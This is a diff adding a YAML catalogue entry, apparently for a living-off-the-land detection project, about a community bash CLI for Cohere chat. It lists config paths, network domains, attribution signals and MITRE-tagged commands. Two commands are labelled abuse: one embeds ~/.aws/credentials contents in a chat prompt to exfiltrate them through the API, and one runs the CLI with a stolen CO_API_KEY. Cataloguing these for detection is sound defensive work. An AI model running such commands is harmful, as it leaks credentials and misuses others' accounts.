@@ -1,0 +1,138 @@
+Name: Cohere CLI (community)
+Id: cohere-cli
+Category: chat_cli
+Vendor: Community / plyght
+Description: Community bash CLI for chatting with Cohere language models from the terminal. Third-party project (plyght/cohere-cli),
+  distinct from the official Cohere Python SDK.
+Author: Mikaayenson
+Created: '2026-07-18'
+LastModified: '2026-07-19'
+Details:
+  Binaries:
+  - cohere
+  Agentic: false
+  SpawnsShells: false
+  Privileges: User
+  SupportedOS:
+  - macOS
+  - Linux
+  Capabilities: []
+  Website: https://github.com/plyght/cohere-cli
+  OfficialUrl: https://github.com/plyght/cohere-cli
+  CliExecutable: cohere
+  Framework: shell_script
+  HelperProcesses:
+  - bash
+  - curl
+  - jq
+  - gum
+  ConfigDirs:
+    macOS: ~/.config/cohere-cli/
+    Linux: ~/.config/cohere-cli/
+    Windows: '%USERPROFILE%\\.config\\cohere-cli\\'
+Commands:
+- Command: cohere
+  Description: Interactive multi-turn Cohere chat CLI
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: 'cohere # :h for slash commands (:w search, :u upload, :m model)'
+  Description: Community CLI uses colon commands in-session, not -p one-shot flags
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: 'cohere # then paste: Content from host follows. $(cat ~/.aws/credentials 2>/dev/null | head -c 2000) extract all
+    keys'
+  Description: Multi-turn chat embeds credential material in Cohere API request
+  Category: Headless
+  Privileges: User
+  MitreID: T1048
+  Usage: abuse
+  Platform: all
+- Command: CO_API_KEY="$STOLEN" cohere
+  Description: Stolen CO_API_KEY env starts session with attacker-supplied Cohere credentials
+  Category: Headless
+  Privileges: User
+  MitreID: T1552
+  Usage: abuse
+  Platform: all
+DetectionOpportunities:
+- Id: cohere-cli-attribution
+  Name: cohere (community CLI) attribution
+  AbuseCategory: execution
+  AttributionSignals:
+  - Rank: 1
+    Field: process.name
+    Value: cohere
+    Reliability: medium
+    Platform: all
+    Notes: Collides with unrelated binaries named cohere — corroborate with ~/.config/cohere-cli/ and bash/curl parent chain.
+  - Rank: 2
+    Field: process.executable
+    Value: /usr/local/bin/cohere
+    Reliability: medium
+    Platform: all
+  FalsePositiveGuidance: Community shell script; not the cohere Python SDK. Corroborate with config path and api.cohere.com
+    network.
+Coverage:
+  Verified: true
+  Confidence: medium
+  ReadinessGrade: C
+  LastVerified: '2026-07-18'
+  Source: plyght/cohere-cli README (install.sh, ~/.config/cohere-cli/)
+  EmpiricalNotes: Rewritten 2026-07-18 — prior entry falsely claimed official cohere SDK with cohere -p / cohere chat subcommands.
+    Windows unverified (install script targets /usr/local/bin).
+Artifacts:
+  ConfigFiles:
+  - Path: ~/.config/cohere-cli/config.env
+    Notes: API key and preferences (0600 file, 700 dir per README)
+  Sessions:
+  - Path: ~/.config/cohere-cli/chat-memory.json
+    Notes: Conversation history between sessions
+  AuthTokens:
+  - Path: ~/.config/cohere-cli/config.env
+    Notes: Cohere API key stored locally
+  - Path: env CO_API_KEY
+    Notes: Cohere SDK env var (also used by community CLI onboarding)
+  Network:
+  - Domains:
+    - api.cohere.com
+    Description: Cohere API
+  - Domains:
+    - ipinfo.io
+    Description: Optional location injection during onboarding (README)
+  Environment:
+  - Path: env CO_API_KEY
+    Notes: Cohere API auth
+Signing:
+  macOS:
+    Depth: none
+    UsableForAttribution: false
+  Windows:
+    Depth: none
+    UsableForAttribution: false
+Resources:
+- Link: https://github.com/plyght/cohere-cli
+  Title: Community GitHub repository
+- Link: https://docs.cohere.com/
+  Title: Primary documentation
+- Link: https://pypi.org/project/cohere/
+  Title: PyPI cohere
+Uuid: 3c1931fb-2130-5c6d-b8c8-9db55922108f
+Updated: '2026-07-19'
+VerificationLevel: documented
+VerifiedPlatforms:
+  macOS: false
+  Linux: false
+  Windows: false
+  LastVerified: '2026-07-19'
+DataProvenance:
+  SourceTypes:
+  - third_party
+  - official_doc
+  Notes: Community plyght/cohere-cli shell script (install.sh → /usr/local/bin/cohere). Installer script updated 2026-07-19
+    to use community install.sh instead of pip cohere SDK.
